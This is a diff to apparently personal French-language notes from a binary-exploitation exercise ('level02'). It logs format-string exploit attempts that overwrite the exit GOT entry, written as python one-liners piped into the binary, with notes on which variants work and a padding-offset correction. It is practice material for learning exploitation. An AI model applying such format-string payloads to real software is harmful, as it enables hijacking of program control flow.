@@ -635,3 +635,12 @@ exit GOT -> system call  ?
 (python -c 'print "%4196997d" + "%8$n"' ; python -c 'print "\x28\x12\x60"'; cat) | ./level02	-> fonctionne
 
 (python -c "print '%4196997d' + '%8$n'" ; python -c "print '\x28\x12\x60'"; cat) | ./level02	-> fonctionne pas
+
+
+
+
+(python "print '\x28\x12\x60' + '%4196997x' + '%28\$n'") | ./level02	-> fonctionne pas ---> -4 is missing !
+
+4196997 - 4 = 4196993
+
+(python "print '\x28\x12\x60' + '%4196993x' + '%28\$n'") | ./level02 =====> ????
